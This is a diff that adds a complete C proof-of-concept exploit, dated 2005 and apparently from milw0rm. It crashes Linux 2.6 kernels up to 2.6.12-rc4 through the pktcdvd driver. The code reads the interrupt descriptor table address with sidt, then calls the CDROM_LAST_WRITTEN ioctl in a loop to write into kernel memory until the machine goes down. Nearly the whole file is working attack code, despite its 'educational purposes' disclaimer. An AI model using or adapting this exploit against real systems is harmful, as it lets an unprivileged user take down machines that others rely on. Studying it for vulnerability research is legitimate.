@@ -1,0 +1,137 @@
+/* pktcdvd_dos.c proof-of-concept 
+* This is only a lame POC which will crash the machine, no root shell here. 
+* --- alert7 
+* 2005-5-15 
+* the vulnerability in 2.6 up to and including 2.6.12-rc4 
+* 
+* gcc -o pktcdvd_dos pktcdvd_dos.c 
+* 
+* NOTE: require user can read pktcdvd block device 
+
+
+* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS" 
+* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION 
+* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED. 
+*/ 
+
+
+#define _GNU_SOURCE 
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <errno.h> 
+#include <string.h> 
+#include <unistd.h> 
+#include <fcntl.h> 
+#include <signal.h> 
+#include <paths.h> 
+#include <grp.h> 
+#include <setjmp.h> 
+#include <stdint.h> 
+#include <sys/mman.h> 
+#include <sys/ipc.h> 
+#include <sys/shm.h> 
+#include <sys/ucontext.h> 
+#include <sys/wait.h> 
+#include <asm/ldt.h> 
+#include <asm/page.h> 
+#include <asm/segment.h> 
+#include <linux/unistd.h> 
+#include <linux/linkage.h> 
+#include <sys/types.h> 
+#include <sys/stat.h> 
+#include <fcntl.h> 
+#include <linux/sysctl.h> 
+#include <linux/cdrom.h> 
+
+
+#define __NR_sys_ioctl __NR_ioctl 
+
+
+
+#define PKTCDVDDEVICE "/dev/hdc" 
+
+
+static inline _syscall3(int, sys_ioctl, int ,fd,int, cmd,unsigned long, arg); 
+
+
+struct idtr { 
+unsigned short limit; 
+unsigned int base; 
+} __attribute__ ((packed)); 
+
+
+unsigned int get_addr_idt() { 
+struct idtr idtr; 
+asm("sidt %0" : "=m" (idtr)); 
+return idtr.base; 
+} 
+struct desc_struct { 
+unsigned long a,b; 
+}; 
+int main(int argc,char **argv) 
+{ 
+unsigned int ptr_idt; 
+int iret ; 
+int fd; 
+
+
+printf("[++]user stack addr %p \n",&ptr_idt); 
+if ( ( (unsigned long )&ptr_idt >>24)==0xfe){ 
+printf("[--]this kernel patched 4g/4g patch,no vulnerability!\n"); 
+return -1; 
+} 
+
+
+ptr_idt=get_addr_idt(); 
+printf("[++]IDT Addr %p \n",ptr_idt); 
+
+
+
+fd = open(PKTCDVDDEVICE,O_RDONLY); 
+if (fd ==-1) 
+{ 
+printf("[--]"); 
+fflush(stdout); 
+perror("open"); 
+return -1; 
+} 
+
+unsigned long WriteTo ; 
+
+
+if ( (ptr_idt>>24)==0xc0){ 
+printf("[++]this OS in Real Linux\n"); 
+WriteTo= ptr_idt; 
+}else{ 
+printf("[++]this OS maybe in VMWARE\n"); 
+WriteTo = 0xc0100000; 
+} 
+
+
+printf("[++]call sys_ioctl will crash machine\n"); 
+fflush(stdout); 
+
+int loopi; 
+for (loopi=0;loopi<0x100000 ;loopi++ ) 
+{ 
+printf("[++]will write data at 0x%x\n",WriteTo+loopi*4); 
+fflush(stdout); 
+iret = sys_ioctl(fd, 
+CDROM_LAST_WRITTEN, 
+WriteTo+loopi*4); 
+if (iret ==-1) 
+{ 
+printf("[--]"); 
+fflush(stdout); 
+perror("ioctl"); 
+//if in VMWARE ,rewrite ptr_idt adress will failed 
+printf("[--]still aliving\n"); 
+close(fd); 
+return -1; 
+} 
+} 
+close(fd); 
+return 0; 
+} 
+
+// milw0rm.com [2005-05-17]
